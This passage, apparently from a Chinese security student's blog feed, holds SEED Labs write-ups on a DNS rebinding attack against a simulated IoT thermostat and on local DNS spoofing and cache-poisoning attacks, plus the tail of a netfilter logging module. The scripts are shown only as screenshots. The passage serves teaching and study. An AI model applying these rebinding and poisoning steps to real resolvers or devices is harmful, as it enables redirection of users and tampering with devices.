NF_INET_LOCAL_OUT;</span><br><span class="line">    hook4.pf = PF_INET;</span><br><span class="line">    hook4.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook4);</span><br><span class="line">    <span class="comment">// NF_INET_POST_ROUTING</span></span><br><span class="line">    hook5.hook = printInfo;</span><br><span class="line">    hook5.hooknum = NF_INET_POST_ROUTING;</span><br><span class="line">    hook5.pf = PF_INET;</span><br><span class="line">    hook5.priority = NF_IP_PRI_FIRST;</span><br><span class="line">    nf_register_net_hook(&amp;init_net, &amp;hook5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">removeFilter</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;seedPrint:The filters are being removed.\n&quot;</span>);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook1);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook2);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook3);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook4);</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;hook5);</span><br><span class="line">&#125;</span><br><span class="line">module_init(registerFilter);</span><br><span class="line">module_exit(removeFilter);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS Rebinding Attack Lab</title>
      <link href="/2022/12/04/DNS_rebind/"/>
      <url>/2022/12/04/DNS_rebind/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本实验室的目标有两个:(1)演示DNS重绑定攻击是如何工作的，(2)提供帮助学生获得如何使用DNS重绑定技术攻击物联网设备的第一手经验。在在设置中，我们有一个模拟物联网设备，它可以通过一个web界面进行控制(这是典型的许多物联网设备)。即使攻击者可以，许多物联网设备也没有强大的保护机制直接与他们互动，他们可以很容易地破坏这些设备。</p><span id="more"></span><p>在这个实验室中模拟的物联网设备是一个恒温器，它可以控制房间的温度。成攻设置温度后，客户端需要能够与物联网服务器进行交互。因为物联网设备防火墙后，外部机器不能与物联网设备交互，因此不能控制恒温器。为了突破防火墙的保护，攻击代码必须进入内部首先网络。这并不难。当来自内部网络的用户访问攻击者的任何时间网站，攻击者的代码(JavaScript代码)实际上是从用户的浏览器运行的，因此在浏览器内部运行受保护的内部网络。但是，由于浏览器实现了沙盒保护，因此攻击者的代码仍然不能与物联网设备交互，即使它现在在内部网络中。</p><p>本实验室的目的是利用DNS重绑定攻击来绕过沙盒保护，因此攻击者的JavaScript代码可以成功获取物联网设备的基本信息然后利用这些信息将恒温器的温度设置到一个危险的高值。这个实验室涵盖了以下主题:</p><p>•DNS服务器设置</p><p>•DNS重绑定攻击</p><p>•攻击物联网设备</p><p>•同源政策</p><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-DNS协议"><a href="#2-1-DNS协议" class="headerlink" title="2.1 DNS协议"></a>2.1 DNS协议</h3><p>域名系统（英语：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h3 id="2-2-同源策略"><a href="#2-2-同源策略" class="headerlink" title="2.2 同源策略"></a>2.2 同源策略</h3><p>在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p><p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于HTTP cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p><p>值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷。</p><h3 id="2-3-拓扑搭建"><a href="#2-3-拓扑搭建" class="headerlink" title="2.3 拓扑搭建"></a>2.3 拓扑搭建</h3><p>DNS重新绑定攻击的网络拓扑如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181028470.png"></p><p>在这个实验室里，我们将使用六台机器。实验环境设置如图1所示。只有用户机器将使用VM，其他的都是容器。在设置中，我们有两个网络，一个家庭网络和外部网络。家庭网络模拟了一个典型的家庭网络。User机器物联网服务连接到该网络，该网络由路由器容器上的防火墙保护。防火墙会阻止所有到达192.168.60.80的流量。这样，外部机器就不能访问物联网设备。我们还在路由器上设置了一个NAT服务器，这样家庭网络中的机器就可以访问外部(回复包可以返回)。</p><p>第二个网络模拟外部网域。除了路由器之外，还有三个容器连接到这个网络，一个作为本地DNS服务器，另外两个作为攻击者的名称服务器和web服务器。攻击者拥有attacker32.com 域，它由攻击者的命名服务器容器。该web服务器上有一个用于攻击的恶意网站。</p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p><p>2．Docker.</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-实验环境配置"><a href="#4-1-实验环境配置" class="headerlink" title="4.1 实验环境配置"></a>4.1 实验环境配置</h3><h4 id="4-1-1-减少Firefox的DNS缓存时间"><a href="#4-1-1-减少Firefox的DNS缓存时间" class="headerlink" title="4.1.1 减少Firefox的DNS缓存时间"></a>4.1.1 减少Firefox的DNS缓存时间</h4><p>减少DNS服务器的负载，加快响应速度时间，Firefox浏览器缓存DNS结果。缺省情况下，缓存过期时间为60秒。这意味着我们的DNS重绑定攻击需要等待至少60秒。为了使我们实验更容易，我们减少了时间为10秒或更短。在URL字段中输入about:config。在点击一个警告页面后，我们将看到首选项名称及其值的列表。搜索dnsCache，找到以下条目和改变它的值。修改如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181029706.png"></p><h4 id="4-1-2-修改-x2F-etc-x2F-host文件"><a href="#4-1-2-修改-x2F-etc-x2F-host文件" class="headerlink" title="4.1.2 修改&#x2F;etc&#x2F;host文件"></a>4.1.2 修改&#x2F;etc&#x2F;host文件</h4><p>我们需要在&#x2F;etc&#x2F;hosts文件中添加以下条目。我们将使用 <a href="http://www.seediot32.com/">www.seedIoT32.com</a> 作为物联网服务器的名称。IP地址为192.168.60.80</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181029139.png"></p><h4 id="4-1-3-本地DNS服务"><a href="#4-1-3-本地DNS服务" class="headerlink" title="4.1.3 本地DNS服务"></a>4.1.3 本地DNS服务</h4><p>我们需要让User VM使用特定的本地DNS服务器。这是通过将本地DNS服务器设置为解析器配置文件中的第一个名称服务器条目来实现(&#x2F;etc&#x2F;resolv.conf)。一个挑战是所提供的虚拟机使用动态主机配置通过DHCP协议获取网络配置参数，如IP地址、本地DNS服务器等。DHCP客户端使用DHCP服务器提供的信息覆盖&#x2F;etc&#x2F;resolv.conf文件。</p><p>在&#x2F;etc&#x2F;resolvconf&#x2F;resolv.conf文件中添加以下条目。D &#x2F;头文件(10.9.0.53是本地DNS服务器的IP地址)。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030382.png"></p><h4 id="4-1-4-测试实验配置"><a href="#4-1-4-测试实验配置" class="headerlink" title="4.1.4 测试实验配置"></a>4.1.4 测试实验配置</h4><p>配置完User虚拟机后，使用dig命令获取 <a href="http://www.attacker32.com/">www.attacker32.com</a> 的IP地址和 ns.attacker32.com 。你应该分别得到10.9.0.180和10.9.0.153。如果你有不明白这个，你的实验室环境没有正确设置。我们现在可以测试攻击者的网站了。将浏览器指向User VM上的以下URL，然后你应该能够看到攻击者的网站。请在你的实验报告中提供一个截图。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030173.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030846.png"></p><p>攻击者网站的内容如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181031002.png"></p><p>说明实验配置搭建成功。</p><h3 id="4-2-在物联网设备上进行攻击"><a href="#4-2-在物联网设备上进行攻击" class="headerlink" title="4.2 在物联网设备上进行攻击"></a>4.2 在物联网设备上进行攻击</h3><h4 id="4-2-1-理解同源策略保护机制"><a href="#4-2-1-理解同源策略保护机制" class="headerlink" title="4.2.1 理解同源策略保护机制"></a>4.2.1 理解同源策略保护机制</h4><p>在本任务中，我们将做一些实验来了解实现的同源策略保护浏览器。点击第二页和第三页的按钮，描述你的观察。哪个页面可以成功设定恒温器的温度?请解释原因。要查找原因，请单击下面的菜单序列从Firefox。将出现一个控制台窗口，其中显示错误消息(如果有的话)。提示:原因与浏览器强制的同源策略有关。请解释为什么这个政策会导致一个失败的页面。</p><p>首先在 <a href="http://www.seediot32.com/change">http://www.seedIoT32.com/change</a> 网站中点击按钮，可以发现温度被成功修改，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181032825.png"></p><p>利用浏览器中的工具，可以观察到下列报文：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181032446.png"></p><p>可以观察到他们都有正确的password，并且报文的来源ip地址与物联网设备的ip地址相同。</p><p>然后在攻击者的网站 <a href="http://www.attacker32.com/change">http://www.attacker32.com/change</a> 中点击按钮，发现该设备的温度并不会发生改变，并且利用火狐浏览器中的工具，可以捕获到以下的报错内容。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181033240.png"></p><p>可以观察到GET报文中报错cross-origin request blocked</p><p>Reason: CORS header ‘Access-Control-Allow-Origin’ missing 经过查询可以得知原因在于对于跨站请求的响应缺少必须的Access-Control-Allow-Origin报头，而该报头用于确定当前站点源内的操作是否可以访问目的网站。这便是同源策略进行保护的原理所在。</p><h4 id="4-2-2-打破同源策略保护机制"><a href="#4-2-2-打破同源策略保护机制" class="headerlink" title="4.2.2 打破同源策略保护机制"></a>4.2.2 打破同源策略保护机制</h4><p>从前面的任务来看，从攻击者的页面设置恒温器的温度似乎是不可能的由于浏览器的同源策略保护。这项任务的目的就是要摧毁这种保护，所以我们可以从这一页设定温度。打击原产地保护的主要思路来自于政策的实施是基于主机名，而不是IP地址，所以只要我们在URL，我们遵守SOP政策，但这并不意味着我们被限制与 <a href="http://www.attacker32.com/">www.attacker32.com</a> web服务器。在用户的浏览器向 <a href="http://www.attacker32.com/">www.attacker32.com</a> 发送请求之前，它首先需要知道IP地址: <a href="http://www.attacker32.com/">www.attacker32.com</a> 。一个DNS请求将从用户的机器发出。如果IP地址没有缓存到本地DNS服务器，DNS请求最终将被发送attacker32.com的名称服务器，由攻击者控制。因此，攻击者可以决定在响应中放入什么。</p><p>攻击步骤如下：</p><p>Step1：修改JavaScript代码</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181035604.png"></p><p>成功修改后，重新打开攻击者的页面，并且点击按钮，发现仍然报错，如下所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181035646.png"></p><p>原因在于未定义password。</p><p>Step2：进行DNS重新绑定</p><p>我们的JavaScript代码将请求发送到 <a href="http://www.attacker32.com/">www.attacker32.com</a> ，也就是说，请求将返回到攻击者的web服务器。这不是我们想要的;我们想要请求到物联网服务器。这可以通过DNS重绑定技术实现。我们首先绘制映射 <a href="http://www.attacker32.com/">www.attacker32.com</a> 到攻击者的web服务器的IP地址，这样用户就可以获得实际的页面从 <a href="http://www.attacker32.com/change">http://www.attacker32.com/change</a> 。在点击页面上的按钮之前，我们要重新映射</p><p>将 <a href="http://www.attacker32.com/">www.attacker32.com</a> 主机名设置为物联网服务器的IP地址，因此该请求由按钮将转到物联网服务器。这正是我们想要的。</p><p>根据实验手册中的指导，我们可以进行如下攻击：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037963.png"></p><p>首先在攻击者的域名服务器上修改默认的TTL响应时间，应该设置一个较小的值，然后将www的DNS解析绑定为物联网设备的IP地址</p><p>然后清除本地DNS的缓存</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037255.png"></p><p>此处重新绑定DNS时，应该是在打开攻击者页面，点击按钮之前，否则攻击就会失败。</p><p>然后再攻击者页面中点击按钮，可以观察到如下内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037029.png"></p><p>可以发现攻击者所发送的报文中有正确的password，其报文也成功被物联网设备所接收，修改其温度为99℃。</p><p>在物联网设备的页面也可以观察到其温度被修改，并且来自于攻击者网站的请求报文。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037955.png"></p><p>攻击成功</p><h4 id="4-2-3-自动进行攻击"><a href="#4-2-3-自动进行攻击" class="headerlink" title="4.2.3 自动进行攻击"></a>4.2.3 自动进行攻击</h4><p>在前面的任务中，用户必须单击按钮将温度设置为危险的高值。显然，用户不太可能这么做。在这个任务中，我们需要自动完成。我们有已经为此创建了一个网页将此页面加载到User VM后，应该能够看到一个带有计时器的页面从10降到0。一旦它达到0，该页上的JavaScript代码将发送设置温度请求 <a href="http://www.attacker32.com/">http://www.attacker32.com</a> ，然后将计时器值重置为10。学生需要使用DNS重绑定技术，所以一旦计时器达到0，恒温器的温度被设置为88摄氏度。</p><p>攻击过程同上，使用DNS重新绑定的方法，需要在页面的计时器数到0的时候进行重新绑定，即可在该页面实现其自动攻击</p><p>如下图所示：</p><p>攻击者的页面内容发生改变，证明其已经连接到了物联网设备</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181038265.png"></p><p>在物联网设备的页面，可以观察到其不断收到来自于攻击者网站的请求，使其温度修改到88℃，证明攻击成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181038880.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Local DNS Attack Lab</title>
      <link href="/2022/11/29/DNS_local/"/>
      <url>/2022/11/29/DNS_local/</url>
      
        <content type="html"><![CDATA[<p>完成时间 <em>2022.11.29</em></p><h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>DNS(域名系统)是互联网的电话簿;它将主机名转换为IP地址(反之亦然)。这种转换是通过DNS解析进行的，它发生在幕后。DNS攻击操作这个解决方案以各种方式进行，目的是误导用户到其他目的地，它们通常是恶意的。这个实验室的目的是了解这种攻击是如何发生的。学生将首先建立和配置DNS服务器，然后他们将尝试各种DNS攻击的目标也是在实验室环境中。</p><span id="more"></span><p>攻击本地受害者和远程DNS服务器的难度是完全不同的。因此,我们开发了两个实验室，一个专注于本地DNS攻击，另一个专注于远程DNS攻击。这个实验室关注本地攻击。本实验室涵盖以下主题:</p><blockquote><p>•DNS及其工作原理</p><p>•DNS服务器设置</p><p>•DNS缓存投毒攻击</p><p>•欺骗DNS响应</p><p>•包嗅探和欺骗</p><p>•Scapy工具</p></blockquote><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-DNS协议"><a href="#2-1-DNS协议" class="headerlink" title="2.1 DNS协议"></a>2.1 DNS协议</h3><p>域名系统（英语：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><h3 id="2-2-拓扑搭建"><a href="#2-2-拓扑搭建" class="headerlink" title="2.2 拓扑搭建"></a>2.2 拓扑搭建</h3><p>DNS 缓存中毒攻击的主要目标是本地 DNS 服务器。 显然，攻击真实的是非法的服务器，所以我们需要架设自己的DNS服务器来进行攻击实验。 实验室环境需要四台独立的机器：一台给受害者，一台给本地 DNS 服务器，另外两台给攻击者。实验环境设置如图 1 所示。本实验侧重于本地攻击，因此我们将所有这些同一局域网上的机器。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004397.png"></p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p><p>2．Docker.</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-Directly-Spoofing-Response-to-User"><a href="#4-1-Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="4.1 Task 1: Directly Spoofing Response to User"></a>4.1 Task 1: Directly Spoofing Response to User</h3><p>当用户在网络浏览器中键入网站名称（主机名，例如 <a href="http://www.example.com)时,用户电脑会向本地dns服务器发送dns请求,解析主机的ip地址姓名./">www.example.com）时，用户电脑会向本地DNS服务器发送DNS请求，解析主机的IP地址姓名。</a> 攻击者可以嗅探 DNS 请求消息，然后他们可以立即创建一个虚假的 DNS 响应，并发送回用户机器。 如果假回复比真实回复早到达，它将被接受用户机器。见下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181004804.png"></p><p>请编写一个程序来发起这样的攻击。</p><p>实现过程：</p><p>在本次攻击时，主要是针对于用户向本地DNS发送请求时，攻击者对用户进行DNS响应，因此可以进行报文伪造的过程如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005997.png"></p><p>根据实验手册中的脚本进行改写如上，其中网卡可以在攻击者主机中使用ip a查询得到，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005381.png"></p><p>在进行攻击前，先利用dig指令查询<a href="http://www.example.net的原始DNS名称服务：">www.example.net的原始DNS名称服务：</a></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181005838.png"></p><p>可以看到其为 93.781.216.34，然后开始进行攻击：</p><p>Step1：</p><p>清除本地DNS服务器的缓存，如果不进行清除的话，用户在向本地DNS服务器进行查询时，其响应速度快于构造报文的转发速度，因而会导致攻击失败。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006474.png"></p><p>Step2：</p><p>执行攻击脚本，再次利用dig查询网址的DNS服务名称，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006694.png"></p><p>可以观察到被成功修改为了1.1.1.1，证明攻击成功。</p><p>Step3：</p><p>查看脚本在网络中嗅探到的报文：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181006931.png"></p><p>可以观察到该报文是从用户发给本地DNS服务器的，而攻击者正是在该过程中，先于本地DNS服务器，将伪造的报文发送给用户，从而实现攻击。</p><h3 id="4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#4-2-Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a>4.2 Task 2: DNS Cache Poisoning Attack – Spoofing Answers</h3><p>上述攻击针对的是用户的机器。为了达到持久的效果，每次用户的机器发出对 <a href="http://www.example.com/">www.example.com</a> 的 DNS 查询 攻击者的机器必须发出一个欺骗性的DNS 响应。这可能不是那么有效；有一种更好的方法来进行攻击DNS 服务器，而不是用户的机器。当本地 DNS 服务器收到查询时，它首先从自己的缓存中查找答案；如果答案在那里，DNS 服务器将简单地使用其缓存中的信息进行回复。如果答案不在缓存，DNS 服务器将尝试从其他 DNS 服务器获取答案。当它得到答案时，它会将答案存储在缓存中，因此下次无需询问其他 DNS 服务器。参见图 2。因此，如果攻击者可以欺骗其他 DNS 服务器的响应，则本地 DNS 服务器将保留缓存中的欺骗性响应会持续一段时间。下次，当用户的机器想要解析相同的主机名，它将从缓存中获取欺骗响应。这样，攻击者只需要欺骗一次，影响将持续到缓存信息过期。这种攻击称为 DNS 缓存中毒。请修改上一个任务中使用的程序以进行此攻击。</p><p>实现过程：</p><p>对python脚本做如下修改：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007740.png"></p><p>修改主要在于嗅探使过滤器的内容，将其源主机修改为本地DNS服务器的IP地址即可。同理在攻击前应该先查看目标网站的原始DNS名称服务内容，同task1中的内容，故不重复。然后开始进行攻击：</p><p>Step1：</p><p>清除本地DNS服务器中已有的缓存</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181007782.png"></p><p>Step2：</p><p>执行攻击脚本，并且用dig命令查看目标网站的DNS域名如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008873.png"></p><p>可以观察到来自于本地DNS服务器中的内容已经修改为了脚本所指定的2.2.2.2，然后再本地DNS服务器中查看缓存内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008709.png"></p><p>攻击脚本中的内容已经成功写入本地DNS服务器，证明攻击成功。</p><p>Step3：</p><p>在攻击后，可以查看攻击脚本执行时，所嗅探到的报文如下，是在本地DNS与目标网站的DNS进行通信时，所截获然后进行伪造的。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181008028.png"></p><h3 id="4-3-Task-3-Spoofing-NS-Records"><a href="#4-3-Task-3-Spoofing-NS-Records" class="headerlink" title="4.3 Task 3: Spoofing NS Records"></a>4.3 Task 3: Spoofing NS Records</h3><p>在上一个任务中，我们的 DNS 缓存投毒攻击只影响一个主机名，即<a href="http://www.example.com.如果用户试图获取另一个主机名的/">www.example.com。如果用户试图获取另一个主机名的</a> IP 地址，例如 mail.example.com，我们需要启动再次袭击。 如果我们发起一次可以影响整个 example.com 的攻击，效率会更高领域。这个想法是在 DNS 回复中使用 Authority 部分。 基本上，当我们欺骗回复时，另外为了欺骗答案（在答案部分），我们在授权部分添加以下内容。 当这个条目由本地 DNS 服务器缓存，ns.attacker32.com 将用作将来的名称服务器查询 example.com 域中的任何主机名。 由于 ns.attacker32.com 由攻击者，它可以为任何查询提供伪造的答案。 本机IP地址为10.9.0.153我们的设置。请在你的攻击代码中添加一条伪造的NS记录，然后发起攻击。</p><p>实现过程：</p><p>实现前我们可以现在攻击者的DNS中查看其所指定的域名内容如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009187.png"></p><p>然后构造攻击脚本如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181009001.png"></p><p>在task2的基础上添加了The Authority Section，作为伪造内容。利用该脚本即可进行如下攻击：</p><p>Step1：</p><p>清空本地DNS的缓存内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010491.png"></p><p>Step2：</p><p>执行攻击脚本，并且利用dig命令查询目标网址的DNS名称如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010663.png"></p><p>可以观察到其内容被成功修改为3.3.3.3，然后再本地DNS服务器上查看当前的缓存内容如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010398.png"></p><p>观察到example.com部分的内容均有脚本所设置的攻击者DNS提供服务，然后利用dig命令查看其是否生效，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181010809.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011373.png"></p><p>可以看到其均为攻击者DNS所指定的内容，因而攻击成功。</p><p>在此处关于<a href="http://www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。">www.example.net该内容由于已经在攻击脚本中指定为3.3.3.3并且在攻击过程中成功存入了本地DNS，因而会优先显示3.3.3.3而不是攻击者DNS中所指定的1.2.3.5。</a></p><h3 id="4-4-Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#4-4-Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="4.4 Task 4: Spoofing NS Records for Another Domain"></a>4.4 Task 4: Spoofing NS Records for Another Domain</h3><p>在前面的攻击中，我们成功地毒化了本地 DNS 服务器的缓存，所以 ns.attacker32.com成为 example.com 域的名称服务器。 受到这一成功的启发，我们想扩展它对其他领域的影响。 即，在由对 <a href="http://www.example.com/">www.example.com</a> 的查询触发的欺骗响应中，我们想在授权部分添加额外的条目（见下文），所以 ns.attacker32.com 也用作 google.com 的名称服务器。</p><p>请稍微修改您的攻击代码，以对您本地的 DNS 服务器发起上述攻击。 之后攻击，检查 DNS 缓存并查看缓存了哪些记录。 请描述并解释你的观察结果。应该注意的是，我们正在攻击的查询仍然是对 example.com 的查询，而不是对google.com。</p><p>实现过程：</p><p>修改脚本代码如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011847.png"></p><p>即在授权部分将谷歌的网站也添加进去，然后再利用该脚本进行如下攻击：</p><p>Step1：</p><p>清空本地DNS的缓存内容</p><p>Step2：</p><p>在攻击者主机中执行攻击脚本，然后再用户主机中利用dig命令查询目标网站的DNS名称如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181011763.png"></p><p>可以观察到其内容被成功修改为4.4.4.4，随后再本地DNS服务器上查询缓存：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181012617.png"></p><p>可以观察到google并没有被写入到本地DNS服务器上，而是只有example.com的DNS被成功修改为了攻击者所提供的DNS，通过查询<a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.7">RFC1034</a> 3.7节中关于authority section 部分的解释，原因在于，在该部分中应该描述answer section中数据的权威域名服务，而在所构造的报文answer部分是根据嗅探到的报文所构建的，而在dig请求中并没google.com 因此answer部分没有，所以只在 authority section 部分的构造并不会写入本地的DNS。</p><h3 id="4-5-Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#4-5-Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="4.5 Task 5: Spoofing Records in the Additional Section"></a>4.5 Task 5: Spoofing Records in the Additional Section</h3><p>在 DNS 回复中，有一个称为附加部分的部分，用于提供附加信息。在实践中，它主要用于为一些主机名提供IP地址，尤其是那些出现在管理局部分。 这个任务的目标是欺骗本节中的一些条目，看看它们是否将被目标本地 DNS 服务器成功缓存。 特别是，在响应查询时<a href="http://www.example.com,我们在欺骗回复中添加以下条目,除了答案部分条目1和2与权限部分中的主机名相关./">www.example.com，我们在欺骗回复中添加以下条目，除了答案部分条目1和2与权限部分中的主机名相关。</a> Entry 完全无关紧要回复中的任何条目，但它为用户提供了“优雅”的帮助，因此他们无需查找 IP脸书地址。 请使用 Scapy 欺骗这样的 DNS 回复。 你的工作是报告哪些条目将是成功缓存，哪些条目不会被缓存； 请解释原因。</p><p>实现过程：</p><p>修改脚本代码如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013939.png"></p><p>即添加三个实验手册中所指定的附加部分。然后利用该脚本进行攻击如下：</p><p>Step1：</p><p>清空本地DNS服务器的缓存：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013320.png"></p><p>Step2：</p><p>在攻击者主机中执行攻击脚本，然后再用户主机上利用dig指令查询目标网站的DNS名称服务如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013394.png"></p><p>可以观察到其IP被成功修改为了脚本中所指定的5.5.5.5，然后在本地服务器上查看缓存内容如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181013586.png"></p><p>可以观察到只有example.com. 777548 IN NS ns.example.com. 和 ns.attacker32.com 被成功写入到本地DNS中，而其他在additional 